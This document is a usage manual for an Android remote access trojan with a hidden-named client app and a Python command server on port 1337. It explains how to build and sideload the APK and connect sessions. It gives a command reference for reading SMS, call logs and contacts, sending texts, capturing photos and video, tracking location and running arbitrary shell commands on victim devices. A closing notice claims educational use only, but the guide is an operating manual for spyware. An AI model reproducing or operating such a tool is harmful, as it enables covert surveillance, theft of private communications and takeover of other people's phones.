# RAT System Usage Guide

## Table of Contents
1. [Quick Start](#quick-start)
2. [Server Setup](#server-setup)
3. [Client Installation](#client-installation)
4. [Command Reference](#command-reference)
5. [Session Management](#session-management)
6. [Troubleshooting](#troubleshooting)

## Quick Start

### Prerequisites
- **Server**: Linux/Windows with Python 3.8+
- **Client**: Android device/emulator with API 21+
- **Network**: Both devices on same network or port forwarding configured

### 1. Start the Server
```bash
cd Server_normad
python3 main.py --host 0.0.0.0 --port 1337
```

### 2. Install Client
```bash
cd Client_normad
./gradlew assembleDebug
adb install -r app/build/outputs/apk/debug/app-debug.apk
```

### 3. Launch Client
```bash
adb shell am start -n com.hidden.client_normad/.MainActivity
```

### 4. Connect to Session
```
RAT> sessions
RAT> session 1
Session[1]> ping
```

## Server Setup

### Installation
```bash
# Clone repository
git clone <repository-url>
cd Project_normad/Server_normad

# Install dependencies
pip3 install -r requirements.txt

# Configure server (optional)
cp config/server_config.json.example config/server_config.json
```

### Configuration
Edit `config/server_config.json`:
```json
{
    "server": {
        "host": "0.0.0.0",
        "port": 1337,
        "max_clients": 100
    },
    "logging": {
        "level": "INFO",
        "file": "logs/server.log"
    }
}
```

### Starting the Server
```bash
# Basic start
python3 main.py

# Custom host/port
python3 main.py --host 192.168.1.100 --port 8080

# No CLI (background mode)
python3 main.py --no-cli

# Help
python3 main.py --help
```

## Client Installation

### Building the APK
```bash
cd Client_normad

# Debug build
./gradlew assembleDebug

# Release build (requires signing)
./gradlew assembleRelease
```

### Installation Methods

#### Method 1: ADB (Development)
```bash
# Install debug APK
adb install -r app/build/outputs/apk/debug/app-debug.apk

# Launch app
adb shell am start -n com.hidden.client_normad/.MainActivity

# Force stop
adb shell am force-stop com.hidden.client_normad
```

#### Method 2: Manual Installation
1. Transfer APK to device
2. Enable "Unknown Sources" in Settings
3. Install APK manually
4. Launch the app

### Client Configuration
The client automatically connects to:
- **Host**: `10.0.2.2` (emulator) or configure in source
- **Port**: `1337`
- **Reconnect**: Every 10 seconds if disconnected

## Command Reference

### Basic Commands

#### `ping`
Test connection and response time.
```
Session[1]> ping
Response: {"status":"success","timestamp":1751234567890}
```

#### `device_info`
Get comprehensive device information.
```
Session[1]> device_info
Response: Device model, Android version, memory, storage, network info, etc.
```

#### `sessions`
List all active sessions (from main RAT prompt).
```
RAT> sessions
Active sessions:
[1] 127.0.0.1:12345 (Pixel_6, Android 13)
[2] 192.168.1.100:54321 (Galaxy_S21, Android 12)
```

### File Operations

#### `file_dirs`
Get common Android directories.
```
Session[1]> file_dirs
Response: /sdcard, /storage/emulated/0, Downloads, Pictures, etc.
```

#### `file_list <path>`
List files and directories.
```
Session[1]> file_list /sdcard
Session[1]> file_list /sdcard/Download
Response: File names, sizes, permissions, timestamps
```

#### `file_download <filepath>`
Get file information for download.
```
Session[1]> file_download /sdcard/photo.jpg
Response: File metadata and download preparation
```

#### `file_upload <filename:base64data>`
Upload file to device.
```
Session[1]> file_upload test.txt:SGVsbG8gV29ybGQ=
Response: Upload status and file location
```

#### `file_delete <filepath>`
Delete file or directory.
```
Session[1]> file_delete /sdcard/temp.txt
Response: Deletion status
```

### SMS and Communication

#### `sms_read [limit]`
Read SMS messages.
```
Session[1]> sms_read
Session[1]> sms_read 20
Response: SMS messages with sender, content, timestamp
```

#### `sms_send <number:message>`
Send SMS message.
```
Session[1]> sms_send +1234567890:Hello World
Response: Send status
```

#### `call_log [limit]`
Get call history.
```
Session[1]> call_log
Session[1]> call_log 50
Response: Call log with numbers, duration, type (incoming/outgoing/missed)
```

#### `contacts [limit]`
Get contact list.
```
Session[1]> contacts
Session[1]> contacts 100
Response: Contact names and phone numbers
```

### Camera Operations

#### `camera_info`
Get camera information and capabilities.
```
Session[1]> camera_info
Response: Available cameras, resolutions, flash support
```

#### `camera_photo [cameraId:quality]`
Capture photo.
```
Session[1]> camera_photo
Session[1]> camera_photo 0:high
Session[1]> camera_photo 1:medium
Response: Photo capture status and file location
```

#### `camera_video_start [cameraId:duration]`
Start video recording.
```
Session[1]> camera_video_start
Session[1]> camera_video_start 0:60
Response: Recording status and file location
```

#### `camera_video_stop`
Stop video recording.
```
Session[1]> camera_video_stop
Response: Recording stop status
```

### Location Tracking

#### `location_providers`
Get location provider status.
```
Session[1]> location_providers
Response: GPS, Network, Passive provider status
```

#### `location_get`
Get current location.
```
Session[1]> location_get
Response: Latitude, longitude, accuracy, provider
```

#### `location_start`
Start location tracking.
```
Session[1]> location_start
Response: Tracking status and update interval
```

#### `location_stop`
Stop location tracking.
```
Session[1]> location_stop
Response: Tracking stop status
```

### Shell Commands

#### `shell_check`
Check shell access and capabilities.
```
Session[1]> shell_check
Response: Shell availability, root access, test results
```

#### `shell_exec <command>`
Execute shell command.
```
Session[1]> shell_exec whoami
Session[1]> shell_exec ls -la /sdcard
Session[1]> shell_exec ps aux
Response: Command output, exit code, execution time
```

#### `shell_system_info`
Get comprehensive system information.
```
Session[1]> shell_system_info
Response: Kernel, uptime, memory, CPU, disk, processes, network
```

#### `shell_interactive <command:input>`
Execute interactive command with input.
```
Session[1]> shell_interactive cat:Hello World
Response: Interactive command output
```

## Session Management

### Connecting to Sessions
```bash
# List active sessions
RAT> sessions

# Connect to specific session
RAT> session 1
Session[1]> 

# Return to main prompt
Session[1]> back
RAT>

# Exit server
RAT> exit
```

### Session Information
Each session shows:
- **Session ID**: Unique identifier
- **IP Address**: Client IP and port
- **Device Info**: Model and Android version
- **Connection Time**: When session started

### Multi-Client Support
- Server supports multiple concurrent clients
- Each client gets unique session ID
- Commands are sent to specific sessions
- Session state is maintained independently

## Troubleshooting

### Connection Issues

#### Client Cannot Connect
1. **Check server status**: Ensure server is running
2. **Verify network**: Client and server on same network
3. **Check firewall**: Port 1337 must be open
4. **Emulator networking**: Use `10.0.2.2` for emulator host

#### Client Disconnects Frequently
1. **Network stability**: Check WiFi/mobile connection
2. **Heartbeat**: System sends heartbeat every 30 seconds
3. **Server logs**: Check for error messages
4. **Permissions**: Ensure app has network permissions

### Permission Issues

#### SMS/Call Features
```
Error: "SMS permission denied"
Solution: Grant SMS permissions in Android settings
```

#### Camera Features
```
Error: "Camera permission denied"
Solution: Grant camera permissions in Android settings
```

#### Location Features
```
Error: "Location permission denied"
Solution: Grant location permissions and enable GPS
```

### Performance Issues

#### Slow Response Times
1. **Network latency**: Check ping times
2. **Device performance**: Older devices may be slower
3. **Command complexity**: Some commands take longer (system_info)

#### Memory Usage
1. **Large outputs**: File listings and system info can be large
2. **Output limits**: System limits output to 1MB per command
3. **Session cleanup**: Sessions auto-cleanup on disconnect

### Common Error Messages

#### "Command not recognized"
- Check command spelling
- Use `help` for available commands
- Ensure client version supports command

#### "Session not found"
- Session may have disconnected
- Use `sessions` to see active sessions
- Reconnect client if needed

#### "Permission denied"
- Grant required Android permissions
- Some features require specific permissions
- Check Android settings > Apps > Permissions

### Debugging

#### Enable Debug Logging
```bash
# Server side
python3 main.py --log-level DEBUG

# Client side (check Android logs)
adb logcat -s RATService:* CommandHandler:*
```

#### Check Network Connectivity
```bash
# Test server port
telnet <server-ip> 1337

# Check client connectivity
adb shell ping <server-ip>
```

#### Verify APK Installation
```bash
# List installed packages
adb shell pm list packages | grep normad

# Check app info
adb shell dumpsys package com.hidden.client_normad
```

---

## Security Notice

This RAT system is designed for educational and authorized testing purposes only. Ensure you have proper authorization before deploying on any device. Always comply with local laws and regulations regarding remote access tools.
